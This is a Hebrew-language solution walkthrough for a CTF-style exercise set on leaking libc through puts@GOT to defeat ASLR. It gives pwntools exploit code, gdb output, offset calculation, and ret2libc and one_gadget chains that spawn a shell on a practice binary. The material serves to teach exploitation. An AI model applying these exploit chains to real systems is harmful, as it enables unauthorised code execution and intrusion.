## פתרון - דליפת libc ועקיפת ASLR

נעבור תרגיל אחרי תרגיל עם הפקודות האמיתיות, הפלט הצפוי, וה-exploit המלא בסוף. הכתובות בפלט הן דוגמה - אצלכם הן ישתנו בכל הרצה בגלל ASLR, וזה בדיוק העניין. אף פעם אל תעתיקו כתובת libc קבועה לסקריפט; תמיד חשבו אותה מהדליפה.
...
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))   # מה שהיה על ראש המחסנית ב-ret
log.info('offset = %d', offset)                 # 72
```

חוצץ 64 ועוד `saved rbp` של 8 נותנים offset 72.

התשובה לשאלת המחשבה: אמנם ה-offset של `system` בתוך libc קבוע, אבל הכתובת הסופית היא `libc_base + offset(system)`, וה-`libc_base` אקראי ונקבע רק בזמן ריצה. לכן אי אפשר לכתוב אותו מראש - חייבים לגלות אותו בהרצה, וזה תפקיד הדליפה.
...
```text
pwndbg> b *vuln+... (אחרי ה-call ל-puts)
pwndbg> run
...
```text
pwndbg> x/gx 0x404018
0x404018 <puts@got.plt>:  0x0000000000401036   <-- עדיין מצביע ל-PLT, לא ל-libc
```

זה בדיוק הלקח: בקישור עצל, הכניסה מתמלאת בכתובת libc האמיתית רק בקריאה הראשונה. לכן נדליף רק פונקציה שכבר נקראה - `puts` מושלמת.

### פתרון תרגיל 3 - שלב הדליפה וחישוב הבסיס

בונים את שרשרת הדליפה, שולחים, ומפענחים:
...
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])   # puts(&puts@got) -> מדליף
...
למה זה עבד: `puts(&puts@got)` הדפיסה את שמונת הבתים ב-`puts@got`, שהם הכתובת האמיתית של `puts` בזמן ריצה. `puts` עצרה ב-null אחרי 6 בתים משמעותיים, `ljust` ריפד ל-8, ו-`u64` פענח. החיסור `leaked - libc.symbols['puts']` נתן את הבסיס. איך להכליל: כל דליפת GOT עובדת ככה - בוחרים סמל פתור, מדפיסים אותו, מחסרים את ה-offset שלו.

### פתרון תרגיל 4 - זיהוי גרסת ה-libc מהדליפה

מסתכלים רק על שלוש הספרות התחתונות של הדליפה. מריצים כמה פעמים:

```text
הרצה 1:  puts @ 0x7f3a1c480e50   -> תחתונות: e50
הרצה 2:  puts @ 0x7f8e9d280e50   -> תחתונות: e50
הרצה 3:  puts @ 0x7f01aa2 80e50  -> תחתונות: e50
```
...
זה החתום המובהק של בעיית היישור. גאדג'ט ה-`ret` הבודד מזיז את `rsp` ב-8 והופך `rsp % 16 == 8` ל-`0`.

למה זה עבד: אחרי ששלב 1 החזיר אותנו ל-`main`, `vuln` רצה שוב וקיבלה את המטען השני. הפעם `rdi` הצביע על `/bin/sh` בכתובת המחושבת, ו-`system` רצה בכתובת המחושבת. איך להכליל: זה ret2libc רגיל, רק שכל הכתובות באות מ-`libc.address` שגילינו, לא קבועות.
...
context.binary = elf = ELF('./leak')
libc = ELF('./libc.so.6')          # מקומי, או זה שזוהה מהדליפה
...
libc.address = leaked - libc.symbols['puts']
log.success('libc base @ %#x', libc.address)
assert libc.address & 0xfff == 0, 'בסיס לא מיושר -> libc לא נכון'
...
במקום שרשרת ה-`system`, שלב 2 הופך לקפיצה בודדת:

```python
rop2 = ROP(libc)
rop2.raw(rop2.find_gadget(['ret'])[0])     # יישור, לעיתים דרוש לתנאי rsp
rop2.raw(libc.address + 0x50a37)           # one_gadget
p.sendline(flat({offset: rop2.chain()}))
```

למה זה עבד: one_gadget מריץ `execve("/bin/sh", 0, 0)` בקפיצה אחת, בלי לבנות ארגומנטים ידנית - כל עוד התנאי על האוגרים מתקיים ברגע הקפיצה. איך להכליל: אם gadget אחד לא עובד (התנאי לא מתקיים), עוברים לבא ברשימה, או חוזרים לשרשרת `system`. נרחיב על one_gadget ועל בחירת המועמד הנכון ב-4.5.

מה חוזר מהתרגול הזה: דליפת GOT דרך `puts`, חישוב בסיס libc, זיהוי גרסה מ-12 הביטים התחתונים, וret2libc בכתובות מחושבות - זו התבנית שתחזור כמעט בכל אתגר pwn עם ASLR. מה שהופך תוקפה ל"אמינה" זה ה-`assert` על הבסיס ופענוח נכון של הדליפה; שני אלה חוסכים שעות של ניפוי שגיאות מול libc לא תואם.
